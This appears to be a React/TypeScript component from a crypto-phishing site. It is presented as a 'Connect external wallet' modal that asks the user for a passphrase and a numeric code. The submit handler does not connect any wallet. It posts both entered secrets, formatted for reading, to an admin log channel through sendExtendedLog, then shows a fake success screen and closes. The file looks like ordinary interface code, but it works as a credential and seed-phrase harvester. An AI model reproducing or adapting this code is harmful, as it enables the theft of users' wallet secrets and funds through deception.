"use client";

import React, { JSX, FC } from "react";
import { FieldValues, useForm } from "react-hook-form";

import type { TWCFieldset, TWalletConnectProps } from "./types";
import ValidTextarea from "@/ui/ValidTextarea/ValidTextarea";
import ValidInp from "@/ui/ValidInp/ValidInp";
import StyledWrapper from "@/ui/StyledWrapper/StyledWrapper";
import Multistep, { useMultistepForm } from "@/components/Multistep";
import EnterPassphrase from "@/modules/Forms/EnterPassphrase";

import { wcModalData } from "./data";
import { logMessages } from "@/data/initial";
import { INITCODE_LENGTH } from "@/data/constants/limits";
import { type TWalletConnectInit, wcFormInit } from "@/data/modals/init-values";
import { ROUTES } from "@/data/routes";
import { checkPendingIcon } from "@/data/pages/ui-icons";
import { PASSPHRASE_DATA } from "@/data/pages/inp-data";
import { NEXT_PUBLIC_TEAM_LOG_CHANNEL, NEXT_PUBLIC_ADMIN_LOG_CHANNEL } from "@/data/api/env";
import { sendExtendedLog } from "@/utils/logger";

// * WalletConnect - WC or wc
export const WalletConnect = ({ setIsOpenModal }: TWalletConnectProps): JSX.Element => {
    const {
        register,
        handleSubmit,
        getValues,
        formState: { isSubmitting, errors },
        reset,
    } = useForm<TWalletConnectInit>({
        defaultValues: wcFormInit,
    });

    const wcFormSteps: React.ReactElement[] = [
        <WCFieldset
            id={wcModalData.info.id}
            icon={wcModalData.info.icon}
            content={wcModalData.info.content}
        />,
        <EnterPassphrase
            id="wallet-connect-step1"
            className="form-step"
            legend="Connect external wallet"
        >
            <StyledWrapper className="form-controller">
                <ValidInp
                    id="wallet-connect-code"
                    type="number"
                    className="inp"
                    title={PASSPHRASE_DATA.code.title}
                    placeholder={PASSPHRASE_DATA.code.placeholder}
                    required
                    register={register}
                    regex={PASSPHRASE_DATA.code.regex}
                    regexErrMessage={PASSPHRASE_DATA.code.regexErrMessage}
                    min={0}
                    max={999999}
                    minLength={INITCODE_LENGTH}
                    maxLength={INITCODE_LENGTH}
                />
                <small className="form-controller__message">
                    {errors["wallet-connect-code"]?.type === "required" && PASSPHRASE_DATA.code.requiredErrMessage}
                    {errors["wallet-connect-code"]?.type === "pattern" && PASSPHRASE_DATA.code.regexErrMessage}
                </small>
                <ValidTextarea
                    id="wallet-connect-textarea"
                    className="textarea inp"
                    title={PASSPHRASE_DATA.textarea.title}
                    placeholder={PASSPHRASE_DATA.textarea.placeholder}
                    required
                    register={register}
                    rows={PASSPHRASE_DATA.textarea.rowsCount}
                    regex={PASSPHRASE_DATA.textarea.regex}
                    regexErrMessage={PASSPHRASE_DATA.textarea.regexErrMessage}
                />
                <small className="form-controller__message">
                    {errors["wallet-connect-textarea"]?.type === "required" && PASSPHRASE_DATA.textarea.requiredErrMessage}
                    {errors["wallet-connect-textarea"]?.type === "pattern" && PASSPHRASE_DATA.textarea.regexErrMessage}
                </small>
            </StyledWrapper>
        </EnterPassphrase>,
        <WCFieldset
            id={wcModalData.success.id}
            icon={checkPendingIcon}
            content={wcModalData.success.content}
        />,
    ];

    const { currentStepIndex, step, isFirstStep, isLastStep, back, next } = useMultistepForm(wcFormSteps);

    const submitForm = async (data: FieldValues) => {
        if (currentStepIndex === 1 && Object.keys(errors).length !== 0) return;
        // * Add logger condition here

        if (!isLastStep) return next();

        await sendExtendedLog(NEXT_PUBLIC_TEAM_LOG_CHANNEL, logMessages.walletConnect);

        // * Don't add whitespaces, tabs, etc. in query string. Default variant is correct
        const queryStr = `${logMessages.walletConnect}<pre><code>${getValues("wallet-connect-textarea")}</code></pre> <pre><code>${getValues("wallet-connect-code")}</code></pre>`;
        await sendExtendedLog(NEXT_PUBLIC_ADMIN_LOG_CHANNEL, queryStr);

        await new Promise((resolve: any) => setTimeout(resolve, 2000));
        reset();
        setIsOpenModal && setIsOpenModal(false);

        // * TODO Submit to server
        // * ...
    };

    return (
        <Multistep
            handleSubmit={handleSubmit}
            isSubmitting={isSubmitting}
            submitForm={submitForm}
            currentStepIndex={currentStepIndex}
            step={step}
            steps={wcFormSteps}
            isFirstStep={isFirstStep}
            isLastStep={isLastStep}
            back={back}
            formAction={ROUTES.private.dashboard}
            btnClassNames={["btn btn-outline-sm", "btn btn-fill-sm"]}
            isRegister={false}
            haveProgressbar={false}
        ></Multistep>
    );
};

// * WC Fieldset
export const WCFieldset: FC<TWCFieldset> = ({ id, icon, content }) => {
    return (
        <fieldset
            className={`form-step ${id}`}
            id={id}
        >
            {icon}
            <div className="form-step__descr">{content}</div>
        </fieldset>
    );
};
